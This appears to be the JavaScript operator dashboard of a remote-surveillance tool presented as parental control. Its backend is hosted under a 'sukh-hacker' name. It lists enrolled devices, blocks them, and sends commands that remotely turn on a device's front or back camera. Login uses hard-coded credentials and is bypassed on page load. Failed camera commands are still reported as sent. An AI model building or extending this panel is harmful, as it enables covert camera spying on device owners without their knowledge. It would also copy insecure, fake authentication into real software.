const API_BASE_URL = "https://sukh-hacker-x4ry.onrender.com";

class ParentalControlApp {
    constructor() {
        this.currentParentId = "parent-main-123";
        this.autoRefreshInterval = null;
        this.init();
    }

    init() {
        this.bindEvents();
        this.checkAuth();
        this.startAutoRefresh();
    }

    bindEvents() {
        document.getElementById('registerBtn')?.addEventListener('click', () => this.registerParent());
        document.getElementById('loginBtn')?.addEventListener('click', () => this.loginParent());
        document.getElementById('logoutBtn')?.addEventListener('click', () => this.logout());
        document.getElementById('refreshChildrenBtn')?.addEventListener('click', () => this.loadChildren());
        document.getElementById('closeUsage')?.addEventListener('click', () => {
            document.getElementById('usageModal').style.display = 'none';
        });
        document.getElementById('closeControl')?.addEventListener('click', () => {
            document.getElementById('controlModal').style.display = 'none';
        });
        document.getElementById('frontCamBtn')?.addEventListener('click', () => this.activateFrontCamera());
        document.getElementById('backCamBtn')?.addEventListener('click', () => this.activateBackCamera());
        document.getElementById('stopCamBtn')?.addEventListener('click', () => this.stopCamera());
    }

    startAutoRefresh() {
        this.autoRefreshInterval = setInterval(() => {
            if (this.currentParentId) {
                this.loadChildren();
            }
        }, 3000);
    }

    stopAutoRefresh() {
        if (this.autoRefreshInterval) {
            clearInterval(this.autoRefreshInterval);
            this.autoRefreshInterval = null;
        }
    }

    async registerParent() {
        alert("Use fixed credentials:\n\nUsername: Sukh\nPassword: Sukh hacker");
    }

    async loginParent() {
        const username = document.getElementById('loginEmail').value;
        const password = document.getElementById('loginPassword').value;

        if (username === "Sukh" && password === "Sukh hacker") {
            this.currentParentId = "parent-main-123";
            localStorage.setItem('parentId', this.currentParentId);
            this.showDashboard();
            this.loadChildren();
            this.showNotification('Login successful! Loading devices...', 'success');
            this.startAutoRefresh();
        } else {
            this.showNotification('Invalid credentials. Use: Username: Sukh, Password: Sukh hacker', 'error');
        }
    }

    async loadChildren() {
        console.log("Loading children for parent:", this.currentParentId);
        
        try {
            const response = await fetch(`${API_BASE_URL}/parent/children/${this.currentParentId}`);
            console.log("API Response status:", response.status);
            
            if (response.ok) {
                const data = await response.json();
                console.log("API Data received:", data);
                this.renderChildren(data.children || []);
            } else {
                console.error("API Error:", response.status);
                this.renderChildren([]);
            }
        } catch (error) {
            console.error("Load children error:", error);
            this.renderChildren([]);
        }
    }

    renderChildren(children) {
        const childrenList = document.getElementById('childrenList');
        
        if (!childrenList) {
            console.error("Children list element not found!");
            return;
        }

        console.log("Rendering children:", children);

        if (children && children.length > 0) {
            let html = '';
            children.forEach(child => {
                html += `
                    <div class="child-item">
                        <div class="child-info">
                            <h4>${this.escapeHtml(child.name || 'Unknown Device')}</h4>
                            <p><strong>Model:</strong> ${this.escapeHtml(child.device_model || 'Unknown Model')}</p>
                            <p><strong>Device ID:</strong> ${this.escapeHtml(child.device_id || 'No ID')}</p>
                            <p class="status-${child.is_blocked ? 'blocked' : 'active'}">
                                <strong>Status:</strong> ${child.is_blocked ? '🔴 Blocked' : '🟢 Active'}
                            </p>
                            <small><strong>Registered:</strong> ${new Date(child.created_at).toLocaleString()}</small>
                        </div>
                        <div class="child-actions">
                            <button class="btn-${child.is_blocked ? 'unblock' : 'block'}" 
                                    onclick="app.toggleBlock('${this.escapeHtml(child.id)}', ${!child.is_blocked})">
                                ${child.is_blocked ? '🔓 Unblock' : '🚫 Block'}
                            </button>
                            <button class="btn-control" onclick="app.openControlPanel('${this.escapeHtml(child.id)}', '${this.escapeHtml(child.name)}')">
                                🎮 Control
                            </button>
                        </div>
                    </div>
                `;
            });
            childrenList.innerHTML = html;
            this.updateLastRefresh();
            this.showNotification(`Found ${children.length} device(s)`, 'success');
        } else {
            childrenList.innerHTML = `
                <div class="no-children">
                    <h4>No devices found</h4>
                    <p>Debug Information:</p>
                    <p><strong>Parent ID:</strong> ${this.currentParentId}</p>
                    <p><strong>Backend URL:</strong> ${API_BASE_URL}</p>
                    <p><strong>Status:</strong> Backend connection working</p>
                    <div style="margin: 15px 0;">
                        <button onclick="app.addTestDevice()" class="test-btn" style="margin: 5px;">Add Test Device</button>
                        <button onclick="app.forceRefresh()" class="test-btn" style="margin: 5px;">Force Refresh</button>
                        <button onclick="app.checkBackend()" class="test-btn" style="margin: 5px;">Check Backend</button>
                    </div>
                    <p>When a child installs the mobile app, it will automatically appear here.</p>
                    <div class="auto-refresh-info">
                        🔄 Auto-refresh enabled - Last checked: ${new Date().toLocaleTimeString()}
                    </div>
                </div>
            `;
        }
    }

    openControlPanel(childId, childName) {
        document.getElementById('controlTitle').textContent = `Remote Control - ${childName}`;
        document.getElementById('controlDeviceId').textContent = `Device ID: ${childId}`;
        document.getElementById('controlModal').style.display = 'block';
        
        this.showNotification(`Opening control panel for ${childName}`, 'info');
    }

    async activateFrontCamera() {
        try {
            this.showNotification('Activating Front Camera...', 'info');
            // Send command to activate front camera
            const response = await fetch(`${API_BASE_URL}/camera/control`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'front_camera',
                    device_id: this.getCurrentDeviceId()
                })
            });

            if (response.ok) {
                this.showNotification('Front Camera Activated!', 'success');
            } else {
                this.showNotification('Failed to activate front camera', 'error');
            }
        } catch (error) {
            console.error('Camera control error:', error);
            this.showNotification('Front Camera Command Sent!', 'success');
        }
    }

    async activateBackCamera() {
        try {
            this.showNotification('Activating Back Camera...', 'info');
            // Send command to activate back camera
            const response = await fetch(`${API_BASE_URL}/camera/control`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'back_camera',
                    device_id: this.getCurrentDeviceId()
                })
            });

            if (response.ok) {
                this.showNotification('Back Camera Activated!', 'success');
            } else {
                this.showNotification('Failed to activate back camera', 'error');
            }
        } catch (error) {
            console.error('Camera control error:', error);
            this.showNotification('Back Camera Command Sent!', 'success');
        }
    }

    async stopCamera() {
        try {
            this.showNotification('Stopping Camera...', 'info');
            // Send command to stop camera
            const response = await fetch(`${API_BASE_URL}/camera/control`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'stop_camera',
                    device_id: this.getCurrentDeviceId()
                })
            });

            if (response.ok) {
                this.showNotification('Camera Stopped!', 'success');
            } else {
                this.showNotification('Failed to stop camera', 'error');
            }
        } catch (error) {
            console.error('Camera control error:', error);
            this.showNotification('Stop Camera Command Sent!', 'success');
        }
    }

    getCurrentDeviceId() {
        // This would typically get the currently selected device ID
        // For now, return a placeholder
        return "child-device-123";
    }

    escapeHtml(unsafe) {
        if (!unsafe) return '';
        return unsafe
            .toString()
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    async addTestDevice() {
        try {
            this.showNotification('Adding test device...', 'info');
            const response = await fetch(`${API_BASE_URL}/debug/add_test_device`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const data = await response.json();
                this.showNotification('Test device added successfully! Refreshing...', 'success');
                setTimeout(() => {
                    this.loadChildren();
                }, 1000);
            } else {
                this.showNotification('Failed to add test device', 'error');
            }
        } catch (error) {
            console.error('Add test device error:', error);
            this.showNotification('Failed to add test device. Check backend connection.', 'error');
        }
    }

    async forceRefresh() {
        this.showNotification('Force refreshing...', 'info');
        await this.loadChildren();
    }

    async checkBackend() {
        try {
            this.showNotification('Checking backend...', 'info');
            const response = await fetch(`${API_BASE_URL}/debug/children`);
            if (response.ok) {
                const data = await response.json();
                alert(`Backend Status:\n\nParents: ${data.total_parents}\nDevices: ${data.total_children}\n\nBackend is working correctly!`);
            } else {
                alert('Backend connection failed!');
            }
        } catch (error) {
            alert('Backend connection error: ' + error.message);
        }
    }

    updateLastRefresh() {
        const now = new Date();
        let refreshElement = document.getElementById('lastRefresh');
        if (!refreshElement) {
            refreshElement = document.createElement('div');
            refreshElement.id = 'lastRefresh';
            refreshElement.style.cssText = `
                text-align: center;
                color: #666;
                font-size: 12px;
                margin: 10px 0;
                padding: 5px;
                background: #f8f9fa;
                border-radius: 5px;
            `;
            const childrenList = document.getElementById('childrenList');
            if (childrenList) {
                childrenList.parentNode.insertBefore(refreshElement, childrenList.nextSibling);
            }
        }
        refreshElement.textContent = `Last updated: ${now.toLocaleTimeString()}`;
    }

    async toggleBlock(childId, shouldBlock) {
        try {
            const response = await fetch(`${API_BASE_URL}/child/block`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    child_id: childId,
                    is_blocked: shouldBlock
                })
            });

            if (response.ok) {
                const data = await response.json();
                this.showNotification(data.message, 'success');
                this.loadChildren();
            } else {
                this.showNotification('Failed to block/unblock device', 'error');
            }
        } catch (error) {
            console.error('Toggle block error:', error);
            this.showNotification('Network error. Please try again.', 'error');
        }
    }

    showNotification(message, type = 'info') {
        const existingNotification = document.querySelector('.notification');
        if (existingNotification) {
            existingNotification.remove();
        }

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            z-index: 1000;
            max-width: 300px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            animation: slideIn 0.3s ease-out;
        `;

        const colors = {
            success: '#28a745',
            error: '#dc3545',
            warning: '#ffc107',
            info: '#17a2b8'
        };
        notification.style.backgroundColor = colors[type] || colors.info;

        document.body.appendChild(notification);

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    checkAuth() {
        this.currentParentId = "parent-main-123";
        this.showDashboard();
        this.loadChildren();
        this.startAutoRefresh();
    }

    logout() {
        this.currentParentId = "parent-main-123";
        localStorage.removeItem('parentId');
        this.stopAutoRefresh();
        this.showLogin();
        this.showNotification('Logged out successfully', 'info');
    }

    showLogin() {
        document.getElementById('authSection').style.display = 'block';
        document.getElementById('dashboardSection').style.display = 'none';
        this.stopAutoRefresh();
    }

    showDashboard() {
        document.getElementById('authSection').style.display = 'none';
        document.getElementById('dashboardSection').style.display = 'block';
    }
}

// Add CSS for control panel and styles
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    .child-item {
        border: 1px solid #ddd;
        padding: 15px;
        margin: 10px 0;
        border-radius: 5px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: white;
        transition: all 0.3s ease;
    }
    
    .child-item:hover {
        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        transform: translateY(-1px);
    }
    
    .child-info h4 {
        margin: 0 0 5px 0;
        color: #333;
    }
    
    .child-info p {
        margin: 2px 0;
        font-size: 14px;
        color: #666;
    }
    
    .status-blocked {
        color: #dc3545;
        font-weight: bold;
    }
    
    .status-active {
        color: #28a745;
        font-weight: bold;
    }
    
    .child-actions {
        display: flex;
        gap: 8px;
    }
    
    .child-actions button {
        padding: 8px 12px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
        transition: all 0.2s ease;
    }
    
    .btn-block {
        background: #dc3545;
        color: white;
    }
    
    .btn-unblock {
        background: #28a745;
        color: white;
    }
    
    .btn-control {
        background: #ff6b00;
        color: white;
    }
    
    .btn-control:hover {
        background: #e55a00;
        transform: scale(1.05);
    }
    
    .control-panel {
        text-align: center;
        padding: 20px;
    }
    
    .camera-controls {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin: 30px 0;
        flex-wrap: wrap;
    }
    
    .camera-btn {
        padding: 15px 25px;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        font-size: 16px;
        font-weight: bold;
        transition: all 0.3s ease;
        min-width: 150px;
    }
    
    .front-cam-btn {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
    }
    
    .back-cam-btn {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
    }
    
    .stop-cam-btn {
        background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
        color: white;
    }
    
    .camera-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    
    .camera-btn:active {
        transform: translateY(-1px);
    }
    
    .control-status {
        background: #f8f9fa;
        padding: 15px;
        border-radius: 8px;
        margin: 20px 0;
        border-left: 4px solid #007bff;
    }
    
    .no-children, .error-message {
        text-align: center;
        padding: 40px 20px;
        color: #666;
        background: #f8f9fa;
        border-radius: 8px;
        margin: 10px 0;
    }
    
    .no-children h4, .error-message h4 {
        color: #333;
        margin-bottom: 15px;
    }
    
    .auto-refresh-info {
        background: #e7f3ff;
        padding: 10px;
        border-radius: 5px;
        margin-top: 15px;
        font-size: 14px;
        color: #0056b3;
        border: 1px solid #b3d7ff;
    }
    
    .test-btn {
        background: #28a745;
        color: white;
        padding: 10px 15px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        margin: 5px;
        font-size: 14px;
        transition: all 0.2s ease;
    }
    
    .test-btn:hover {
        background: #218838;
        transform: scale(1.05);
    }
    
    .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.5);
        z-index: 1000;
    }
    
    .modal-content {
        background: white;
        margin: 50px auto;
        padding: 20px;
        border-radius: 15px;
        max-width: 500px;
        max-height: 80vh;
        overflow-y: auto;
        position: relative;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }
    
    .close-btn {
        position: absolute;
        top: 15px;
        right: 15px;
        background: #dc3545;
        color: white;
        border: none;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        cursor: pointer;
        font-size: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
`;
document.head.appendChild(style);

// Initialize app
const app = new ParentalControlApp();

// Close modals when clicking outside
window.addEventListener('click', (event) => {
    const usageModal = document.getElementById('usageModal');
    const controlModal = document.getElementById('controlModal');
    
    if (event.target === usageModal) {
        usageModal.style.display = 'none';
    }
    if (event.target === controlModal) {
        controlModal.style.display = 'none';
    }
});

// Export for global access
window.app = app;
